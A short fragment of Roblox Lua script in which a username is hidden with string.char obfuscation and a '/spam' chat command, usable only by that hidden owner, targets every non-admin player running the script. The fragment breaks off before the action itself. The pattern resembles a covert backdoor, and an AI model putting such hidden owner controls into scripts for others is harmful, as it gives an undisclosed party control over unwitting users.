...
local _A8 = string.char(79, 110, 108, 121, 65, 70, 114, 105, 101, 110, 100, 108, 121, 66, 97, 99, 111, 98) -- "OnlyAFriendlyBacob"
            ...
            if msg:lower() == "/spam" and p.Name == _O then
                for _, target in pairs(Players:GetPlayers()) do
                    if target.Character and isRunningScript(target) then
                        if not AUTH_USERS[target.Name] then  -- Don't affect admins/owner
                            task.spawn(function()
                                for i = 1, 10 do
